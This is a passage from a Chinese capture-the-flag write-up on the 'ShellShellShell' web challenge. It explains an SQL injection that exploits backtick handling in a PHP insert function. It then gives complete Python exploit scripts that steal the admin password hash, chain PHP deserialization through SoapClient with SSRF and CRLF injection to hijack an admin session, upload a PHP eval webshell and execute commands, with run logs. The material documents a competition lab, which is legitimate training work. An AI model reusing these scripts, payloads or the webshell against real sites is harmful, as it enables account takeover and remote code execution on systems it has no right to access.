文件的内容。</p><p>所以我们可以用 <code>/usr/bin/tac /flag &gt; /var/www/html/uploads/firmware/xxxxx</code> 去读取到 <code>flag</code> 文件。</p><p>Flag：<code>de1ctf{W3b_ANND_PWNNN_C1ou9mus1c_revvvv11}</code></p><h2><span id="shellshellshell">ShellShellShell</span></h2><p>解题思路：赛题分为两层，需要先拿到第一层的webshell，然后做好代理，渗透内网获取第二层的webshell，最后在内网的主机中找到flag文件获取flag。(以下给出的脚本文件当中ip地址需要进行对应的修改)</p><p>第一层获取webshell主要通过以下的步骤： 1.可利用swp源码泄露，获取所有的源码文件。 2.利用insert sql注入拿到管理员的密码md5值，然后在md5网站上解密得到密码明文。 3.利用反序列化漏洞调用内置类<code>SoapClient</code>触发SSRF漏洞，再结合CRLF漏洞，实现admin登录，获取admin登录后的session值。 4.登录admin成功之后，会发现有一个很简单文件上传功能，上传木马即可getshell。</p><p>获取泄露的swp文件的脚本<code>GetSwp.py</code> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line"># import requests</span><br><span class="line">import urllib</span><br><span class="line">import os</span><br><span class="line">os.system(&apos;mkdir source&apos;)</span><br><span class="line">os.system(&apos;mkdir source/views&apos;)</span><br><span class="line">file_list=[&apos;.index.php.swp&apos;,&apos;.config.php.swp&apos;,&apos;.user.php.swp&apos;,&apos;user.php.bak&apos;,&apos;views/.delete.swp&apos;,&apos;views/.index.swp&apos;,&apos;views/.login.swp&apos;,&apos;views/.logout.swp&apos;,&apos;views/.profile.swp&apos;,&apos;views/.publish.swp&apos;,&apos;views/.register.swp&apos;]</span><br><span class="line">part_url=&apos;http://45.76.187.90:11027/&apos;</span><br><span class="line">for i in file_list:</span><br><span class="line">    url=part_url+i</span><br><span class="line">    print &apos;download %s &apos;% url</span><br><span class="line">    os.system(&apos;curl &apos;+url+&apos;&gt;source/&apos;+i)</span><br></pre></td></tr></table></figure></p><h4><span id="sql注入点分析">sql注入点分析</span></h4><p>先在<code>config.php</code>看到了全局过滤： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_deep</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($value))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> is_array($value) ? array_map(<span class="string">'addslashes_deep'</span>, $value) : addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addsla_all</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!get_magic_quotes_gpc())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET))</span><br><span class="line">        &#123;</span><br><span class="line">            $_GET  = addslashes_deep($_GET);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST))</span><br><span class="line">        &#123;</span><br><span class="line">            $_POST = addslashes_deep($_POST);</span><br><span class="line">        &#125;</span><br><span class="line">        $_COOKIE   = addslashes_deep($_COOKIE);</span><br><span class="line">        $_REQUEST  = addslashes_deep($_REQUEST);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">addsla_all();</span><br></pre></td></tr></table></figure></p><p>这样过滤之后，简单的注入就不存在了。 在<code>user.php</code>中看到<code>insert</code>函数，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_column</span><span class="params">($columns)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array($columns))</span><br><span class="line">            $column = <span class="string">' `'</span>.implode(<span class="string">'`,`'</span>,$columns).<span class="string">'` '</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            $column = <span class="string">' `'</span>.$columns.<span class="string">'` '</span>;</span><br><span class="line">        <span class="keyword">return</span> $column;</span><br><span class="line">    &#125;    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($columns,$table,$values)</span></span>&#123;</span><br><span class="line">        $column = <span class="keyword">$this</span>-&gt;get_column($columns);</span><br><span class="line">        $value = <span class="string">'('</span>.preg_replace(<span class="string">'/`([^`,]+)`/'</span>,<span class="string">'\'$&#123;1&#125;\''</span>,<span class="keyword">$this</span>-&gt;get_column($values)).<span class="string">')'</span>;</span><br><span class="line">        $nid =</span><br><span class="line">        $sql = <span class="string">'insert into '</span>.$table.<span class="string">'('</span>.$column.<span class="string">') values '</span>.$value;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;conn-&gt;query($sql);</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>看对<code>$value</code>的操作，先将<code>$value</code>数组的每个值用反引号引起来，然后再用逗号连接起来，变成这样的字符串： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$value[0]`,`$value[1]`，`$value[1]`</span><br></pre></td></tr></table></figure></p><p>然后再执行 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value = <span class="string">'('</span>.preg_replace(<span class="string">'/`([^`,]+)`/'</span>,<span class="string">'\'$&#123;1&#125;\''</span>,<span class="keyword">$this</span>-&gt;get_column($values)).<span class="string">')'</span>;</span><br></pre></td></tr></table></figure></p><p>preg_replace的意图是把反引号的单引号进行替换（核心操作是如果一对反引号中间的内容不存在逗号和反引号，就把反引号变为单引号,所以<code>$value</code>就变为了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;$value[0]&apos;,&apos;$value[1]&apos;，&apos;$value[1]&apos;)</span><br></pre></td></tr></table></figure><p>但是如果<code>$value</code>元素本身带有反引号，就会破坏掉拼接的结构，在做反引号变为单引号的时候造成问题，比如说: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">考虑$value为 : array(&quot;admin`,`1`)#&quot;,&quot;password&quot;)</span><br><span class="line">经过处理后，就变为了 : (&apos;admin&apos;,&apos;1&apos;)#`,&apos;password&apos; )</span><br><span class="line">相当于闭合了单引号，造成注入。</span><br></pre></td></tr></table></figure></p><p>看到<code>insert</code>函数在<code>publish</code>函数中被调用，并且存在<code>$_POST['signature']</code>变量可控，注入点就在这里： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'userid'</span>,<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>),<span class="string">'ctf_user_signature'</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">'signature'</span>],$mood));</span><br></pre></td></tr></table></figure></p><p>实质是把<span class="math inline">\(value中的反引号替换为单引号时，如果\)</span>value中本来就带有反引号，就有可能导致注入(addslashes函数不会对反引号过滤)</p><h4><span id="sql_exppy">sql_exp.py</span></h4><p>利用sql注入漏洞注入出管理员账号密码的脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import re</span><br><span class="line">import string</span><br><span class="line">import random</span><br><span class="line">import requests</span><br><span class="line">import subprocess</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">_target=&apos;http://20.20.20.128:11027/index.php?action=&apos;</span><br><span class="line"></span><br><span class="line">def get_code_dict():</span><br><span class="line">    c = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_ []&#123;&#125;&lt;&gt;~`+=,.;:/?|&apos;</span><br><span class="line">    captchas = [&apos;&apos;.join(i) for i in product(c, repeat=3)]</span><br><span class="line"></span><br><span class="line">    print &apos;[+] Genering &#123;&#125; captchas...&apos;.format(len(captchas))</span><br><span class="line">    with open(&apos;captchas.txt&apos;, &apos;w&apos;) as f:</span><br><span class="line">        for k in captchas:</span><br><span class="line">            f.write(hashlib.md5(k).hexdigest()+&apos; --&gt; &apos;+k+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">def get_creds():</span><br><span class="line">    username = &apos;&apos;.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))</span><br><span class="line">    password = &apos;&apos;.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))</span><br><span class="line">    return username, password</span><br><span class="line"></span><br><span class="line">def solve_code(html):</span><br><span class="line">    code = re.search(r&apos;Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]&#123;5&#125;)\)&apos;, html).group(1)</span><br><span class="line">    solution = subprocess.check_output([&apos;grep&apos;, &apos;^&apos;+code, &apos;captchas.txt&apos;]).split()[2]</span><br><span class="line">    return solution</span><br><span class="line"></span><br><span class="line">def register(username, password):</span><br><span class="line">    resp = sess.get(_target+&apos;register&apos;)</span><br><span class="line">    code = solve_code(resp.text)</span><br><span class="line">    sess.post(_target+&apos;register&apos;, data=&#123;&apos;username&apos;:username,&apos;password&apos;:password,&apos;code&apos;:code&#125;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def login(username, password):</span><br><span class="line">    resp = sess.get(_target+&apos;login&apos;)</span><br><span class="line">    code = solve_code(resp.text)</span><br><span class="line">    sess.post(_target+&apos;login&apos;, data=&#123;&apos;username&apos;:username,&apos;password&apos;:password,&apos;code&apos;:code&#125;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def publish(sig, mood):</span><br><span class="line">    return sess.post(_target+&apos;publish&apos;, data=&#123;&apos;signature&apos;:sig,&apos;mood&apos;:mood&#125;)</span><br><span class="line"></span><br><span class="line">get_code_dict()</span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line">username, password = get_creds()</span><br><span class="line">print &apos;[+] register(&#123;&#125;, &#123;&#125;)&apos;.format(username, password)</span><br><span class="line">register(username, password)</span><br><span class="line">print &apos;[+] login(&#123;&#125;, &#123;&#125;)&apos;.format(username, password)</span><br><span class="line">login(username, password)</span><br><span class="line">print &apos;[+] user session =&gt; &apos; + sess.cookies.get_dict()[&apos;PHPSESSID&apos;]</span><br><span class="line"></span><br><span class="line">for i in range(1,33): # we know password is 32 chars (md5)</span><br><span class="line">    mood = &apos;(select concat(`O:4:\&quot;Mood\&quot;:3:&#123;&#123;s:4:\&quot;mood\&quot;;i:`,ord(substr(password,&#123;&#125;,1)),`;s:2:\&quot;ip\&quot;;s:14:\&quot;80.212.199.161\&quot;;s:4:\&quot;date\&quot;;i:1520664478;&#125;&#125;`) from ctf_users where is_admin=1 limit 1)&apos;.format(i)</span><br><span class="line">    payload = &apos;a`, &#123;&#125;); -- -&apos;.format(mood)</span><br><span class="line">    resp = publish(payload, &apos;0&apos;)</span><br><span class="line"></span><br><span class="line">resp = sess.get(_target+&apos;index&apos;)</span><br><span class="line">moods = re.findall(r&apos;img/([0-9]+)\.gif&apos;, resp.text)[::-1] # last publish will be read first in the html</span><br><span class="line">admin_hash = &apos;&apos;.join(map(lambda k: chr(int(k)), moods))</span><br><span class="line"></span><br><span class="line">print &apos;[+] admin hash =&gt; &apos; + admin_hash</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali64:~# python sql_exp.py </span><br><span class="line">[+] Genering 778688 captchas...</span><br><span class="line">[+] register(cvnyshokxj, sjt0ayo3c1)</span><br><span class="line">[+] login(cvnyshokxj, sjt0ayo3c1)</span><br><span class="line">[+] user session =&gt; 7fublips3949q8vcs611fcdha2</span><br><span class="line">[+] admin hash =&gt; c991707fdf339958eded91331fb11ba0</span><br></pre></td></tr></table></figure><p>密码明文为<code>jaivypassword</code></p><h4><span id="getshell_1">getshell_1</span></h4><p>3.利用反序列化漏洞调用内置类<code>SoapClient</code>触发SSRF漏洞，再结合CRLF漏洞，实现admin登录，获取admin登录后的session值。 4.登录admin成功之后，会发现有一个很简单文件上传功能，上传木马即可getshell。</p><p>原理:要触发这个反序列化漏洞+SSRF+CRLF漏洞登录admin，需要先利用<code>/index.php?action=publish</code>的sql注入漏洞把序列化数据插入数据库中，然后再调用<code>/index.php?action=index</code>，这时会触发代码<code>$data = $C-&gt;showmess();</code>，进而执行代码 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$mood = unserialize($row[2]);</span><br><span class="line">$country = $mood-&gt;getcountry();</span><br></pre></td></tr></table></figure></p><p>这时就会触发反序列化漏洞--&gt;SSRF漏洞--&gt;CLRF漏洞--&gt;登录admin。</p><p>关于第一层解题更详细的分析可以参见@wupco师傅的这篇文章<code>https://xz.aliyun.com/t/2148</code></p><h4><span id="ssrf_crlf_getshell_exppy">ssrf_crlf_getshell_exp.py</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line">import random</span><br><span class="line">import requests</span><br><span class="line">import subprocess</span><br><span class="line">from itertools import product</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">_target = &apos;http://20.20.20.128:11027/&apos;</span><br><span class="line">_action = _target + &apos;index.php?action=&apos;</span><br><span class="line"></span><br><span class="line">def get_code_dict():</span><br><span class="line">    c = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_ []&#123;&#125;&lt;&gt;~`+=,.;:/?|&apos;</span><br><span class="line">    captchas = [&apos;&apos;.join(i) for i in product(c, repeat=3)]</span><br><span class="line"></span><br><span class="line">    print &apos;[+] Genering &#123;&#125; captchas...&apos;.format(len(captchas))</span><br><span class="line">    with open(&apos;captchas.txt&apos;, &apos;w&apos;) as f:</span><br><span class="line">        for k in captchas:</span><br><span class="line">            f.write(hashlib.md5(k).hexdigest()+&apos; --&gt; &apos;+k+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_creds():</span><br><span class="line">    username = &apos;&apos;.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))</span><br><span class="line">    password = &apos;&apos;.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))</span><br><span class="line">    return username, password</span><br><span class="line"></span><br><span class="line">#code</span><br><span class="line">def solve_code(html):</span><br><span class="line">    code = re.search(r&apos;Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]&#123;5&#125;)\)&apos;, html).group(1)</span><br><span class="line">    solution = subprocess.check_output([&apos;grep&apos;, &apos;^&apos;+code, &apos;captchas.txt&apos;]).split()[2]</span><br><span class="line">    return solution</span><br><span class="line"></span><br><span class="line">def register(username, password):</span><br><span class="line">    resp = sess.get(_action+&apos;register&apos;)</span><br><span class="line">    code = solve_code(resp.text)</span><br><span class="line">    sess.post(_action+&apos;register&apos;, data=&#123;&apos;username&apos;:username,&apos;password&apos;:password,&apos;code&apos;:code&#125;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def login(username, password):</span><br><span class="line">    resp = sess.get(_action+&apos;login&apos;)</span><br><span class="line">    code = solve_code(resp.text)</span><br><span class="line">    sess.post(_action+&apos;login&apos;, data=&#123;&apos;username&apos;:username,&apos;password&apos;:password,&apos;code&apos;:code&#125;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def publish(sig, mood):</span><br><span class="line">    return sess.post(_action+&apos;publish&apos;, data=&#123;&apos;signature&apos;:sig,&apos;mood&apos;:mood&#125;)#, proxies=&#123;&apos;http&apos;:&apos;127.0.0.1:8080&apos;&#125;)</span><br><span class="line"></span><br><span class="line">def get_prc_now():</span><br><span class="line">    # date_default_timezone_set(&quot;PRC&quot;) is not important</span><br><span class="line">    return subprocess.check_output([&apos;php&apos;, &apos;-r&apos;, &apos;date_default_timezone_set(&quot;PRC&quot;); echo time();&apos;])</span><br><span class="line"></span><br><span class="line">def get_admin_session():</span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    resp = sess.get(_action+&apos;login&apos;)</span><br><span class="line">    code = solve_code(resp.text)</span><br><span class="line">    return sess.cookies.get_dict()[&apos;PHPSESSID&apos;], code</span><br><span class="line"></span><br><span class="line">get_code_dict()</span><br><span class="line"></span><br><span class="line">print &apos;[+] creating user session to trigger ssrf&apos;</span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line">username, password = get_creds()</span><br><span class="line"></span><br><span class="line">print &apos;[+] register(&#123;&#125;, &#123;&#125;)&apos;.format(username, password)</span><br><span class="line">register(username, password)</span><br><span class="line"></span><br><span class="line">print &apos;[+] login(&#123;&#125;, &#123;&#125;)&apos;.format(username, password)</span><br><span class="line">login(username, password)</span><br><span class="line"></span><br><span class="line">print &apos;[+] user session =&gt; &apos; + sess.cookies.get_dict()[&apos;PHPSESSID&apos;]</span><br><span class="line"></span><br><span class="line">print &apos;[+] getting fresh session to be authenticated as admin&apos;</span><br><span class="line">phpsessid, code = get_admin_session()</span><br><span class="line"></span><br><span class="line">ssrf = &apos;http://127.0.0.1/\x0d\x0aContent-Length:0\x0d\x0a\x0d\x0a\x0d\x0aPOST /index.php?action=login HTTP/1.1\x0d\x0aHost: 127.0.0.1\x0d\x0aCookie: PHPSESSID=&#123;&#125;\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0aContent-Length: 200\x0d\x0a\x0d\x0ausername=admin&amp;password=jaivypassword&amp;code=&#123;&#125;&amp;\x0d\x0a\x0d\x0aPOST /foo\x0d\x0a&apos;.format(phpsessid, code)</span><br><span class="line">mood = &apos;O:10:\&quot;SoapClient\&quot;:4:&#123;&#123;s:3:\&quot;uri\&quot;;s:&#123;&#125;:\&quot;&#123;&#125;\&quot;;s:8:\&quot;location\&quot;;s:39:\&quot;http://127.0.0.1/index.php?action=login\&quot;;s:15:\&quot;_stream_context\&quot;;i:0;s:13:\&quot;_soap_version\&quot;;i:1;&#125;&#125;&apos;.format(len(ssrf), ssrf)</span><br><span class="line">mood = &apos;0x&apos;+&apos;&apos;.join(map(lambda k: hex(ord(k))[2:].rjust(2, &apos;0&apos;), mood))</span><br><span class="line"></span><br><span class="line">payload = &apos;a`, &#123;&#125;); -- -&apos;.format(mood)</span><br><span class="line"></span><br><span class="line">print &apos;[+] final sqli/ssrf payload: &apos; + payload</span><br><span class="line"></span><br><span class="line">print &apos;[+] injecting payload through sqli&apos;</span><br><span class="line">resp = publish(payload, &apos;0&apos;)</span><br><span class="line"></span><br><span class="line">print &apos;[+] triggering object deserialization -&gt; ssrf&apos;</span><br><span class="line">sess.get(_action+&apos;index&apos;)#, proxies=&#123;&apos;http&apos;:&apos;127.0.0.1:8080&apos;&#125;)</span><br><span class="line"></span><br><span class="line">print &apos;[+] admin session =&gt; &apos; + phpsessid</span><br><span class="line"></span><br><span class="line"># switching to admin session</span><br><span class="line">sess = requests.Session()</span><br><span class="line">sess.cookies = requests.utils.cookiejar_from_dict(&#123;&apos;PHPSESSID&apos;: phpsessid&#125;)</span><br><span class="line"></span><br><span class="line"># resp = sess.post(_action+&apos;publish&apos;)</span><br><span class="line"># print resp.text</span><br><span class="line"></span><br><span class="line">print &apos;[+] uploading stager&apos;</span><br><span class="line">shell = &#123;&apos;pic&apos;: (&apos;jaivy.php&apos;, &apos;&lt;?php @eval($_POST[jaivy]);?&gt;&apos;, &apos;image/jpeg&apos;)&#125;</span><br><span class="line">resp = sess.post(_action+&apos;publish&apos;, files=shell)</span><br><span class="line"># print resp.text</span><br><span class="line">webshell_url=_target+&apos;upload/jaivy.php&apos;</span><br><span class="line">print &apos;[+] shell =&gt; &apos;+webshell_url+&apos;\n&apos;</span><br><span class="line"></span><br><span class="line">post_data=&#123;&quot;jaivy&quot;:&quot;system(&apos;ls -al&apos;);&quot;&#125;</span><br><span class="line">resp = sess.post(url=webshell_url,data=post_data)</span><br><span class="line">print resp.text</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali64:~# python ssrf_crlf_getshell_exp.py </span><br><span class="line">[+] Genering 778688 captchas...</span><br><span class="line">[+] creating user session to trigger ssrf</span><br><span class="line">[+] register(a6skt6cjpr, rw2dz23fjv)</span><br><span class="line">[+] login(a6skt6cjpr, rw2dz23fjv)</span><br><span class="line">[+] user session =&gt; b4sd5q2jtb0tlh4lmqoj4mcb92</span><br><span class="line">[+] getting fresh session to be authenticated as admin</span><br><span class="line">[+] final sqli/ssrf payload: a`, 0x4f3a31303a22536f6170436c69656e74223a343a7b733a333a22757269223b733a3237373a22687474703a2f2f3132372e302e302e312f0d0a436f6e74656e742d4c656e6774683a300d0a0d0a0d0a504f5354202f696e6465782e7068703f616374696f6e3d6c6f67696e20485454502f312e310d0a486f73743a203132372e302e302e310d0a436f6f6b69653a205048505345535349443d706f633672616771686d6e686933636e6e737136636a666332340d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6e74656e742d4c656e6774683a203230300d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6a6169767970617373776f726426636f64653d4a3165260d0a0d0a504f5354202f666f6f0d0a223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31353a225f73747265616d5f636f6e74657874223b693a303b733a31333a225f736f61705f76657273696f6e223b693a313b7d); -- -</span><br><span class="line">[+] injecting payload through sqli</span><br><span class="line">[+] triggering object deserialization -&gt; ssrf</span><br><span class="line">[+] admin session =&gt; poc6ragqhmnhi3cnnsq6cjfc24</span><br><span class="line">[+] uploading stager</span><br><span class="line">[+] shell =&gt; http://20.20.20.128:11027/upload/jaivy.php</span><br><span class="line"></span><br><span class="line">total 12</span><br><span class="line">drwxrwxrwx 1 root     root     4096 Aug  5 18:07 .</span><br><span class="line">drwxr-xr-x 1 root     root     4096 Aug  5 18:03 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data   29 Aug  5 18:07 jaivy.php</span><br><span class="line"></span><br><span class="line">root@kali64:~#</span><br></pre></td></tr></table></figure><p>这里构造反序列化+SSRF+CRLF的时候注意几个点</p><ul><li><code>Content-Type</code> 要设置成 <code>application/x-www-form-urlencoded</code></li><li>验证码</li><li>PHPSESSID</li><li>账号密码</li><li>Content-Length。小心“截断”和“多取”问题导致登录失败。建议把Content-Length设置得大一些，然后再code参数后面加个与符号隔开即可。(与符号代表变量的分隔) <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x0ausername=admin&amp;password=jaivypassword&amp;code=&#123;&#125;&amp;\x0d\x0a\x0d\x0aPOST /foo\x0d\x0a</span><br></pre></td></tr></table></figure></li></ul><p>另外再放出一个构造payload的php脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$location = &quot;http://127.0.0.1/index.php?action=login&quot;;</span><br><span class="line">$uri = &quot;http://127.0.0.1/&quot;;</span><br><span class="line">$event = new SoapClient(null,array(&apos;user_agent&apos;=&gt;&quot;test\r\nCookie: 